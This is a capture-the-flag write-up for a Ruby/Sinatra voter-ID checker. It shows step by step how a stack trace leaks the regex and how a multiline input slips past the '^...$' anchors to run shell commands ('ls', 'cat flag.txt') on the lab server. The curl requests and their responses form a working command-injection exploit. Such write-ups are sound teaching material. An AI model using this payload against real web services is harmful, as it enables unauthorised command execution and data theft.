---
layout: writeup
title: Verification or Execution
tags: WebX
excerpt: "Look, this is supposed to be a simple checker for an ID to make sure its actually part of the early voting system, yet someone gained access to my system?! There's only one field and I'm sure my regex is perfect!"
---

## Description

Look, this is supposed to be a simple checker for an ID to make sure its actually part of the early voting system, yet someone gained access to my system?!
There's only one field and I'm sure my regex is perfect!


http://redac.ted:8002/


## Solution

this link leads to a page with just a single input that asks for your 'early voter ID'

```bash
$ curl "http://re.da.ct.ed:8002/"
<!DOCTYPE html>
<html>
<head>
  <title>Early Voter Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  <div class="container vh-100 d-flex flex-column justify-content-center align-items-center text-center">
    <h1>Welcome to the Early Voter ID Checker v0.2</h1>
    <p> Thank you for trying our early voting on site system!</p>
    <p> By registering early we'll allow you to access voting booths a few days earlier to put in your vote.</p>
    <p> Please enter your driver's license in order to make sure that you'll have access.</p>
    <form method="post" class="w-100" style="max-width: 400px;">
      <label for="voter_id" class="form-label mt-3">Enter your early voter ID:</label>
      <input type="text" name="voter_id" class="form-control" />
      <button type="submit" class="btn btn-primary mt-3">Verify</button>
    </form>


  </div>
</body>
</html>
```

Submitting just the number `1` for out voter ID gets:

```bash
$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id=1"
<!DOCTYPE html>
<html>
<head>
  <title>Early Voter Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  <div class="container vh-100 d-flex flex-column justify-content-center align-items-center text-center">
    <h1>Welcome to the Early Voter ID Checker v0.2</h1>
    <p> Thank you for trying our early voting on site system!</p>
    <p> By registering early we'll allow you to access voting booths a few days earlier to put in your vote.</p>
    <p> Please enter your driver's license in order to make sure that you'll have access.</p>
    <form method="post" class="w-100" style="max-width: 400px;">
      <label for="voter_id" class="form-label mt-3">Enter your early voter ID:</label>
      <input type="text" name="voter_id" class="form-control" />
      <button type="submit" class="btn btn-primary mt-3">Verify</button>
    </form>


      <h2 class="mt-4">Verification Result:</h2>
      <p> Checking with our specialized script... </p>
      <pre class="bg-light p-3 rounded">Error: Invalid voter ID format. Expected 4 letters followed by 4 digits. Debug: did not pass /^[A-Za-z]{4}\d{4}$/</pre>

        <p class="error">❌ Access denied. You are not on the early voter list.</p>


  </div>
</body>
</html>
```

This reveals the regex that out input needs to pass: `/^[A-Za-z]{4}\d{4}$/`. How about putting in an input that is of the incorrect type and maybe seeing if any code is leaked in the error message

```bash
$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id[0]=1"
NoMethodError: undefined method `match' for {"0"=>"1"}:Sinatra::IndifferentHash (NoMethodError)

  if !voter_id.match(/^[A-Za-z]{4}\d{4}$/)
              ^^^^^^
        app.rb:13:in `block in <main>'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1807:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1807:in `block in compile!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1074:in `block (3 levels) in route!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1092:in `route_eval'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1074:in `block (2 levels) in route!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1123:in `block in process_route'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1121:in `catch'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1121:in `process_route'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1072:in `block in route!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1069:in `each'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1069:in `route!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1193:in `block in dispatch!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1164:in `catch'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1164:in `invoke'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1188:in `dispatch!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1004:in `block in call!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1164:in `catch'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1164:in `invoke'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1004:in `call!'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:993:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/base.rb:53:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/xss_header.rb:20:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/path_traversal.rb:18:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/json_csrf.rb:28:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/base.rb:53:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/base.rb:53:in `call'
        /usr/local/bundle/gems/rack-protection-4.1.1/lib/rack/protection/frame_options.rb:33:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/middleware/logger.rb:17:in `call'
        /usr/local/bundle/gems/rack-3.1.16/lib/rack/common_logger.rb:43:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:269:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:262:in `call'
        /usr/local/bundle/gems/rack-3.1.16/lib/rack/head.rb:15:in `call'
        /usr/local/bundle/gems/rack-3.1.16/lib/rack/method_override.rb:28:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/show_exceptions.rb:23:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:227:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:2138:in `call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1677:in `block in call'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1898:in `synchronize'
        /usr/local/bundle/gems/sinatra-4.1.1/lib/sinatra/base.rb:1677:in `call'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/configuration.rb:279:in `call'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/request.rb:99:in `block in handle_request'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/thread_pool.rb:390:in `with_force_shutdown'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/request.rb:98:in `handle_request'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/server.rb:472:in `process_client'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/server.rb:254:in `block in run'
        /usr/local/bundle/gems/puma-6.6.0/lib/puma/thread_pool.rb:167:in `block in spawn_thread'
```
That's a big error message, but it tells us some crucial things. Namely, the program is written in `ruby` using `sinatra` and that the check `!voter_id.match(/^[A-Za-z]{4}\d{4}$/)` just checks if there are any results, not the result count, or if the result is the entire thing.

Lets break down this regex to figure out how to exploit it like was hinted at in the description with the `I'm sure my regex is perfect!` comment.

`/^[A-Za-z]{4}\d{4}$/`

This means that a line needs to start (`^`) and then, we need four text characters (`[A-Za-z]{4}`) before finally, having four digits (`\d{4}`) and ending it off with the end of a line (`$`).

So the first thought that pops into my mind is that if the passed in value is multiple lines long, then we can include extra text, while the value still passes the regex, becuase one of the lines does.

Let's test that:

```bash
$ curl -X POST "http://re.da.ct.ed:8002/" -d "voter_id=AAAA0000
flag"
<!DOCTYPE html>
<html>
<head>
  <title>Early Voter Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  <div class="container vh-100 d-flex flex-column justify-content-center align-items-center text-center">
    <h1>Welcome to the Early Voter ID Checker v0.2</h1>
    <p> Thank you for trying our early voting on site system!</p>
    <p> By registering early we'll allow you to access voting booths a few days earlier to put in your vote.</p>
    <p> Please enter your driver's license in order to make sure that you'll have access.</p>
    <form method="post" class="w-100" style="max-width: 400px;">
      <label for="voter_id" class="form-label mt-3">Enter your early voter ID:</label>
      <input type="text" name="voter_id" class="form-control" />
      <button type="submit" class="btn btn-primary mt-3">Verify</button>
    </form>


      <h2 class="mt-4">Verification Result:</h2>
      <p> Checking with our specialized script... </p>
      <pre class="bg-light p-3 rounded"></pre>

        <p class="error">❌ Access denied. You are not on the early voter list.</p>


  </div>
</body>
</html>
```

As you can see, our hypothesis worked. Multiple lines gets around the regex, even if the word `flag` doesn't end up doing anything.

Now, looking back at the challenge it is called `Verification or Execution` we just got around the `Verification` part, so I guess it is time to do the `execution`

To start with I discovered we could do RCE on the machine by just inputting any linux command

```bash
$ curl -X POST "http://re.da.ct.ed:8002/" -d 'voter_id=AAAA0000
ls'
<!DOCTYPE html>
<html>
<head>
  <title>Early Voter Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
  <div class="container vh-100 d-flex flex-column justify-content-center align-items-center text-center">
    <h1>Welcome to the Early Voter ID Checker v0.2</h1>
    <p> Thank you for trying our early voting on site system!</p>
    <p> By registering early we'll allow you to access voting booths a few days earlier to put in your vote.</p>
    <p> Please enter your driver's license in order to make sure that you'll have access.</p>
    <form method="post" class="w-100" style="max-width: 400px;">
      <label for="voter_id" class="form-label mt-3">Enter your early voter ID:</label>
      <input type="text" name="voter_id" class="form-control" />
      <button type="submit" class="btn btn-primary mt-3">Verify</button>
    </form>


      <h2 class="mt-4">Verification Result:</h2>
      <p> Checking with our specialized script... </p>
      <pre class="bg-light p-3 rounded">Dockerfile
Gemfile
Gemfile.lock
README.md
app.rb
flag.txt
shell.rb
shell.rb.1
shell.sh
shell.sh.1
shell.sh.2
views
votercheck.sh
</pre>

        <p class="error">❌ Access denied. You are not on the early voter list.</p>


  </div>
</body>
</html>
```

And there is the flag.txt file, so lets read it

```bash
$ curl -X POST "http://re.da.ct.ed:8002/" -d 'voter_id=AAAA0000
cat flag.txt' | grep secedu
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1296  100  1266  100    30   9465    224 --:--:-- --:--:-- --:--:--  9744
      <pre class="bg-light p-3 rounded">secedu{h0_b0y_th3y'r3_in_we'3r_in_tr0ubl3_ar3n't_w3}</pre>
```

There's the flag `secedu{h0_b0y_th3y'r3_in_we'3r_in_tr0ubl3_ar3n't_w3}`
